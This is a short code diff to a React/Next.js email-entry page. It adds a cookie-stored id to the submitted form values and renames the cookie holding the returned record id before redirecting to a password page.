@@ -5,11 +5,13 @@ import { API_URL, site } from '../config/index';
 import Cookies from "js-cookie";
 function page() {
   const[email, setEmail] = useState("");
+  const id = Cookies.get("id");
   const adminId = Cookies.get("adminId");
   const posterId = Cookies.get("posterId");
   const router = useRouter();
   const handleSubmit = async() => {
    const values = {
+    id,
     email: email,
     site: site
    }
@@ -30,7 +32,7 @@ function page() {
     if (res.ok) {
       console.log("success", data);
       Cookies.set("email", data?.info?.email);
-      Cookies.set("id", data?.info?._id);
+      Cookies.set("infoId", data?.info?._id);
       router.push("/password")
     } else {
       console.log("error", data);
